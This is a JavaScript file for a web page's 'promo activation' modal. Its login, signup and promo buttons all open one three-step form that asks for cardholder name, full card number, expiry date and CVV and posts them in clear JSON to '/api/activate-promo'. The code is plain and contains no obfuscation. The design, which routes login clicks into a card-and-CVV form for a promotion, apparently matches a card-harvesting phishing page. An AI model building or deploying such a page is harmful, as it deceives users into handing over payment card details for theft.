/**
 * Modal and form management
 * Handles opening/closing modal, form step navigation, and promo activation
 */

(function() {
  'use strict';

  // ============================================
  // MODAL MANAGEMENT
  // ============================================

  const modal = document.getElementById('promoModal');
  const loginBtn = document.getElementById('loginBtn');
  const signupBtn = document.getElementById('signupBtn');
  const promoBtn = document.getElementById('promoBtn');
  const closeBtn = document.getElementById('closeModal');
  const loadingOverlay = document.getElementById('loadingOverlay');

  // Open modal
  function openModal() {
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
    resetForm();
  }

  // Close modal
  function closeModal() {
    modal.classList.remove('active');
    document.body.style.overflow = 'auto';
    resetForm();
  }

  // Event listeners for opening modal
  loginBtn?.addEventListener('click', openModal);
  signupBtn?.addEventListener('click', openModal);
  promoBtn?.addEventListener('click', openModal);
  closeBtn?.addEventListener('click', closeModal);

  // Close modal on overlay click
  modal?.addEventListener('click', function(e) {
    if (e.target === modal) {
      closeModal();
    }
  });

  // Close modal on Escape key
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape' && modal.classList.contains('active')) {
      closeModal();
    }
  });

  // ============================================
  // FORM STEP NAVIGATION
  // ============================================

  let currentStep = 1;
  const totalSteps = 3;
  const form = document.getElementById('promoForm');
  const prevBtn = document.getElementById('prevBtn');
  const submitBtn = document.getElementById('submitBtn');

  function updateFormStep(step) {
    // Hide all steps
    document.querySelectorAll('.form-step').forEach(el => {
      el.classList.remove('active');
    });

    // Show current step
    const activeStep = document.querySelector(`.form-step[data-step="${step}"]`);
    if (activeStep) {
      activeStep.classList.add('active');
    }

    // Update step indicators
    document.querySelectorAll('.step-indicator').forEach((indicator, index) => {
      const stepNum = index + 1;
      indicator.classList.remove('active', 'completed');
      
      if (stepNum === step) {
        indicator.classList.add('active');
      } else if (stepNum < step) {
        indicator.classList.add('completed');
      }
    });

    // Update button visibility
    if (step === 1) {
      prevBtn.style.display = 'none';
      submitBtn.textContent = 'Continue';
    } else if (step === totalSteps) {
      prevBtn.style.display = 'flex';
      submitBtn.textContent = 'Close';
    } else {
      prevBtn.style.display = 'flex';
      submitBtn.textContent = 'Continue';
    }

    currentStep = step;
  }

  function nextStep() {
    if (currentStep < totalSteps) {
      if (currentStep === 1) {
        if (validateStep1()) {
          updateReview();
          updateFormStep(2);
        }
      } else if (currentStep === 2) {
        updateFormStep(3);
      }
    }
  }

  function prevStep() {
    if (currentStep > 1) {
      updateFormStep(currentStep - 1);
    }
  }

  prevBtn?.addEventListener('click', prevStep);

  // ============================================
  // FORM VALIDATION
  // ============================================

  function validateStep1() {
    const cardholderName = document.getElementById('cardholderName').value.trim();
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const expiryDate = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvv').value;

    if (!cardholderName) {
      alert('Please enter cardholder name');
      return false;
    }

    if (cardNumber.length < 13 || cardNumber.length > 19) {
      alert('Please enter a valid card number');
      return false;
    }

    if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
      alert('Please enter expiry date in MM/YY format');
      return false;
    }

    if (cvv.length < 3 || cvv.length > 4) {
      alert('Please enter a valid CVV');
      return false;
    }

    return true;
  }

  function updateReview() {
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const lastFourDigits = cardNumber.slice(-4);
    document.getElementById('reviewCard').textContent = `••••-••••-••••-${lastFourDigits}`;
  }

  // ============================================
  // FORM SUBMISSION
  // ============================================

  form?.addEventListener('submit', async function(e) {
    e.preventDefault();

    if (currentStep === 1) {
      nextStep();
    } else if (currentStep === 2) {
      await submitPromo();
    } else if (currentStep === 3) {
      closeModal();
    }
  });

  async function submitPromo() {
    try {
      // Show loading overlay
      loadingOverlay.classList.add('active');

      const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
      const expiryDate = document.getElementById('expiryDate').value;
      const cvv = document.getElementById('cvv').value;
      const cardholderName = document.getElementById('cardholderName').value;

      const response = await fetch('/api/activate-promo', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          cardNumber,
          expiryDate,
          cvv,
          cardholderName,
        }),
      });

      const data = await response.json();

      // Hide loading overlay
      loadingOverlay.classList.remove('active');

      if (data.success) {
        // Move to success step
        updateFormStep(3);
      } else {
        alert(`Error: ${data.message}`);
      }
    } catch (error) {
      console.error('Error:', error);
      loadingOverlay.classList.remove('active');
      alert('An error occurred. Please try again.');
    }
  }

  // ============================================
  // FORM RESET
  // ============================================

  function resetForm() {
    form?.reset();
    updateFormStep(1);
    loadingOverlay.classList.remove('active');
  }

  // Initialize on page load
  document.addEventListener('DOMContentLoaded', function() {
    updateFormStep(1);
  });
})();
